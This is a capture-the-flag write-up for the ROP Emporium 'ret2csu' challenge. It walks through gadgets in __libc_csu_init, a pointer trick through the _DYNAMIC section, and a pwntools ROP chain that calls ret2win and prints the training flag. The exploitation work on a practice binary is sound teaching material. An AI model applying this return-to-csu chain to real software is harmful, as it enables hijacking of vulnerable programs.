# GIST
The goal of this exercise is to pass 3 parameters to the ret2win function. The thing is, there aren't any useful ROP gadgets in the binary, that we can use to get values into rdi, rsi AND rdx. 

# Link
Read about it [here](https://ropemporium.com/challenge/ret2csu.html)
Also, read up on ret2csu [here](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf)

# Identifying and Analyzing Functions


Since this is a universal ROP exercise, let's look for statically linked functions in the binary:
```sh
ubuntu@ubuntu:~/ropemporium/ret2csu$ nm -a ret2csu | grep " t\|T "
0000000000400560 t deregister_tm_clones
0000000000400550 T _dl_relocate_static_pie
00000000004005d0 t __do_global_dtors_aux
00000000004006b4 t .fini
00000000004006b4 T _fini
0000000000400600 t frame_dummy
00000000004004d0 t .init
00000000004004d0 T _init
00000000004006b0 T __libc_csu_fini
0000000000400640 T __libc_csu_init
0000000000400607 T main
00000000004004f0 t .plt
0000000000400590 t register_tm_clones
0000000000400520 T _start
0000000000400520 t .text
0000000000400617 t usefulFunction
```

From reading the instructions, and knowing how the callme exercise worked, we know that we need to call `ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d)` in order to get the flag.  

Let's see if there are any gadgets in any of the statically-linked functions that will help us get values into rdi, rsi, and rdx:
```asm
gef➤  disass __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   0x0000000000400640 <+0>:	push   r15
   0x0000000000400642 <+2>:	push   r14
   0x0000000000400644 <+4>:	mov    r15,rdx
   0x0000000000400647 <+7>:	push   r13
   0x0000000000400649 <+9>:	push   r12
   0x000000000040064b <+11>:	lea    r12,[rip+0x20079e]        # 0x600df0
   0x0000000000400652 <+18>:	push   rbp
   0x0000000000400653 <+19>:	lea    rbp,[rip+0x20079e]        # 0x600df8
   0x000000000040065a <+26>:	push   rbx
   0x000000000040065b <+27>:	mov    r13d,edi
   0x000000000040065e <+30>:	mov    r14,rsi
   0x0000000000400661 <+33>:	sub    rbp,r12
   0x0000000000400664 <+36>:	sub    rsp,0x8
   0x0000000000400668 <+40>:	sar    rbp,0x3
   0x000000000040066c <+44>:	call   0x4004d0 <_init>
   0x0000000000400671 <+49>:	test   rbp,rbp
   0x0000000000400674 <+52>:	je     0x400696 <__libc_csu_init+86>
   0x0000000000400676 <+54>:	xor    ebx,ebx
   0x0000000000400678 <+56>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000400680 <+64>:	mov    rdx,r15			<--------------------------- :) (gadget 2)
   0x0000000000400683 <+67>:	mov    rsi,r14
   0x0000000000400686 <+70>:	mov    edi,r13d
   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040068d <+77>:	add    rbx,0x1
   0x0000000000400691 <+81>:	cmp    rbp,rbx
   0x0000000000400694 <+84>:	jne    0x400680 <__libc_csu_init+64>
   0x0000000000400696 <+86>:	add    rsp,0x8
   0x000000000040069a <+90>:	pop    rbx			<---------------------------- :) (gadget 1)
   0x000000000040069b <+91>:	pop    rbp
   0x000000000040069c <+92>:	pop    r12
   0x000000000040069e <+94>:	pop    r13
   0x00000000004006a0 <+96>:	pop    r14
   0x00000000004006a2 <+98>:	pop    r15
   0x00000000004006a4 <+100>:	ret    
End of assembler dump.
gef➤  
```

Note: tools like ropper or ROPgadgets won't catch gadget 2 :(  

Hold up, we can't get a value into rdi!  
mov    edi,r13d will place a 32-bit value into edi, and we want a 64-bit value (0xdeadbeefdeadbeef) in rdi.  

Let's look for a rop gadget:

```sh
ubuntu@ubuntu:~/ropemporium/ret2csu$ ropper -f ret2csu  | grep "rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0000000000400622: add byte ptr [rax], al; add byte ptr [rdi + 1], bh; call 0x510; nop; pop rbp; ret; 
0x0000000000400624: add byte ptr [rdi + 1], bh; call 0x510; nop; pop rbp; ret; 
0x00000000004006a3: pop rdi; ret; 
```

Okay, sweet, we can now control all 3 values.


# Setting up our ROP chain
We can use gadgets 1 and 2 to get values into rdi and rsi.  
Then when we return from gadget 2, we can return to the "pop rdi" gadget (gadget 3), to get 0xdeadbeefdeadbeef into rdi.

The way that gadget2 returns is a bit unconventional.  
In particular, it will be a little tricky using this assembly instruction:

```asm
   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
```

We can start off by making things a bit simpler and making sure that rbx has a value of 0.  
So now we just need to make sure that r12 stores an address that points to the address of our next gadget...  
Huh?

```
r12: <address> -> <address of "pop rdi; ret" gadget>
```

That way when we call [r12], we will call/jump to the value stored at <address>, which will be the address of our gadget.  

Pointers are hard, and the simplest way to do this is to just take advantage of the fact that ASLR is disabled.  
But we should act like ASLR is enabled, for the sake of masochism.

So, we're going to jump to an address that has a ROP gadget. It's easiest if this ROP gadget doesn't do anything at all.  
Hmm... but since we're jumping to [r12] we need to find an address that stores the address of ROP gadget.  

Let's use what we know about universal ROP to our advantage -- let's look at all of the staticall linked functions, and try to find a ROP gadget that does pretty much nothing...  

```sh
ubuntu@ubuntu:~/ropemporium/ret2csu$ nm -a ret2csu | grep " t\|T "
0000000000400560 t deregister_tm_clones
0000000000400550 T _dl_relocate_static_pie
00000000004005d0 t __do_global_dtors_aux
00000000004006b4 t .fini
00000000004006b4 T _fini
0000000000400600 t frame_dummy
00000000004004d0 t .init
00000000004004d0 T _init
00000000004006b0 T __libc_csu_fini
0000000000400640 T __libc_csu_init
0000000000400607 T main
00000000004004f0 t .plt
0000000000400590 t register_tm_clones
0000000000400520 T _start
0000000000400520 t .text
0000000000400617 t usefulFunction
```

```asm
gef➤  disass _fini
Dump of assembler code for function _fini:
   0x00000000004006b4 <+0>:	sub    rsp,0x8
   0x00000000004006b8 <+4>:	add    rsp,0x8
   0x00000000004006bc <+8>:	ret    
End of assembler dump.
```

Okay, sweet, this gadget does nothing. We know that addresses of linked libraries are usually stored in the DYNAMIC section...  
Let's just go ahead and run a find on the address of \_fini:

```asm
gef➤  find "0x00000000004006b4"
Searching for '0x00000000004006b4' in: None ranges
Found 4 results, display max 4 items:
ret2csu : 0x4003b0 --> 0x4006b4 (<_fini>:	sub    rsp,0x8)
ret2csu : 0x400e48 --> 0x4006b4 (<_fini>:	sub    rsp,0x8)
ret2csu : 0x6003b0 --> 0x4006b4 (<_fini>:	sub    rsp,0x8)
ret2csu : 0x600e48 --> 0x4006b4 (<_fini>:	sub    rsp,0x8)
```

We can resolve the address of the DYNAMIC segment using pwntools :)

```python3
In [12]: elf = ELF("./ret2csu")                                                                                                         

In [13]: p64(elf.symbols['_DYNAMIC'])                                                                                                   
Out[13]: b'\x00\x0e`\x00\x00\x00\x00\x00'
```

Note: \` = 0x60 in ascii.  
So, DYNAMIC segment starts at 0x600e0000.  
We can just add 0x48 to start of the \_DYNAMIC segment to get the address of the linked function \_fini

```python
nothing_gadget = p64(elf.symbols['_DYNAMIC'] + (16 * 4 + 8))
```

Okay, so program flow will look a bit like this: 
```
1) overflow buffer
--> 2) gadget1 
--> 3) gadget2
--> 4) nothing gadget
--> 5) continues execution
--> 6) gadget 1
--> 7) pop rdi
```

So we have enough knowledge so far to get us to step 4, but what happens after nothing gadget returns?  

```asm
[----------------------------------registers-----------------------------------]
RAX: 0xb ('\x0b')
RBX: 0x0 
RCX: 0x7ffff7cca0a7 (<__GI___libc_write+23>:	cmp    rax,0xfffffffffffff000)
RDX: 0xd00df00dd00df00d 
RSI: 0xcafebabecafebabe 
RDI: 0x0 
RBP: 0x1 
RSP: 0x7fffffffdff8 --> 0x0 
RIP: 0x40068d (<__libc_csu_init+77>:	add    rbx,0x1)
R8 : 0xb ('\x0b')
R9 : 0x2 
R10: 0x7ffff7feeeb0 (pxor   xmm0,xmm0)
R11: 0x246 
R12: 0x600e48 --> 0x4006b4 (<_fini>:	sub    rsp,0x8)
R13: 0x0 
R14: 0xcafebabecafebabe 
R15: 0xd00df00dd00df00d
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400683 <__libc_csu_init+67>:	mov    rsi,r14
   0x400686 <__libc_csu_init+70>:	mov    edi,r13d
   0x400689 <__libc_csu_init+73>:	call   QWORD PTR [r12+rbx*8]
=> 0x40068d <__libc_csu_init+77>:	add    rbx,0x1
   0x400691 <__libc_csu_init+81>:	cmp    rbp,rbx
   0x400694 <__libc_csu_init+84>:	jne    0x400680 <__libc_csu_init+64>
   0x400696 <__libc_csu_init+86>:	add    rsp,0x8
   0x40069a <__libc_csu_init+90>:	pop    rbx				<------------ start of gadget1
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdff8 --> 0x0 
0008| 0x7fffffffe000 --> 0x0 
0016| 0x7fffffffe008 --> 0x0 
0024| 0x7fffffffe010 --> 0x0 
0032| 0x7fffffffe018 --> 0x0 
0040| 0x7fffffffe020 --> 0x0 
0048| 0x7fffffffe028 --> 0x0 
0056| 0x7fffffffe030 --> 0x4006a3 (<__libc_csu_init+99>:	pop    rdi)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gef➤  
```

Looks like it will continue until it hits gadget1 again.  
Let's just make sure rbp = 0x1 and rbx = 0x0, and we should be able to continue onto gadget1.  
Oh also, we'll put a random garbage value on the stack to account for the `add rsp, 0x8` instruction.  

After this, we'll return to our `pop rdi` instruction, and we should be gtg.

Let's spin up ROP chain using pwntools:
```python
rop_chain = [
        buf,
        ebp,
        gadget1,
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # rbx 
        b'\x01\x00\x00\x00\x00\x00\x00\x00',    # rbp
        nothing_gadget,                         # r12
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # r13
        b'\xbe\xba\xfe\xca\xbe\xba\xfe\xca',    # r14
        b'\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0',    # r15
        gadget2,                                # call [r12 + rbx*8] should point to nothing gadget, which will return to gadget2
        # add 1 to ebp, cmp to ebx
        # add 0x8 to esp
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # garbage
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # rbx
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # rbp
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # r12
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # r13
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # r14
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # r15
        pop_rdi,
        b"\xef\xbe\xad\xde\xef\xbe\xad\xde",
        ret2win,
        ]
```

Full python script is available as well.  

```sh
ubuntu@ubuntu:~/ropemporium/ret2csu$ python3 exploit.py 2>/dev/null  | grep "ROPE"
ROPE{a_placeholder_32byte_flag!}
```




		          
		          
		          
		          
		          







